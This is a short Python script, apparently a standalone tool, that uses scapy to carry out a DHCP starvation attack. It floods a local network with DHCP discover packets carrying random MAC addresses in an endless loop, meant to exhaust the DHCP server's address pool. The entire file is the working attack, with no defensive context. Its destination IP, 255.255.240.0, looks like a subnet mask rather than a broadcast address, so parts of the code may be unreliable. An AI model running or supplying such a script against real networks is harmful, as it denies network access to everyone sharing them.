#!/usr/bin/env python3

from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf
import argparse

# Disable IP address checking to allow arbitrary source IPs
conf.checkIPaddr = False

# Function to create and send DHCP discovery packets
def dhcp_starvation(interface):
    # Create a random MAC address
    random_mac = RandMAC()

    # Construct a DHCP discover packet
    dhcp_discover = (
            Ether(dst='ff:ff:ff:ff:ff:ff', src=random_mac) /
            IP(src='0.0.0.0', dst='255.255.240.0') /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=random_mac) /
            DHCP(options=[('message-type', 'discover'), 'end'])
    )

    # Send packets continuously on the specified interface
    print(f"[*] Starting DHCP Starvation Attack on interface {interface}...")
    sendp(dhcp_discover, iface=interface, loop=1, verbose=1)

if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Perform a DHCP starvation attack.")
    parser.add_argument('-i', '--interface', default='wlan0', help='Network interface to use (default: wlan0)')
    args = parser.parse_args()

    # Call the function with the specified interface
    dhcp_starvation(args.interface)
